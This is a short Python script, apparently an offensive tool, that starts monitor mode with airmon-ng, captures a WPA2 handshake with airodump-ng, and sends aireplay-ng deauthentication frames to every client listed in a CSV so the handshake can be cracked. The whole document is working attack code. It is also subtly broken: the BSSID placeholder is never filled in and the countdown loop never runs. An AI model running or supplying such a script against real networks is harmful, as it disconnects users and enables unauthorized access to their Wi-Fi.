#!/usr/bin/python3
import threading
import time
import csv
import os

def deauth(client):
    command = "sudo aireplay-ng -0 1 -a {station_bssid} -c {} wlan0mon".format(client)

    os.system(command)

print("[!] Run this script as root")

print("Attack will start in 5 seconds.")

for i in range(5, 0):
    print(i)
    time.sleep(1)

os.system("sudo airmon-ng check kill")
os.system("sudo airmon-ng start wlan0")

wpa_handshake_thread = threading.Thread(target=os.system, args=("sudo airodump-ng -c 1 --bssid {station_bssid} -w wpa2crack wlan0mon",))
wpa_handshake_thread.start()

clients = []

with open("sp91-01.csv") as file:
    csv_reader = csv.reader(file)

    for i in csv_reader:
        try:
            if ":" in i[0]:
                print(i[0])
                clients.append(i[0])

        except:
            pass

for i in clients:
    if i != "{station_bssid}":
        deauth_thread = threading.Thread(target=deauth, args=(i,))
        deauth_thread.start()

print("Deauthorizing clients...")

time.sleep(10)
exit("Attack finished")
os.system("reboot")
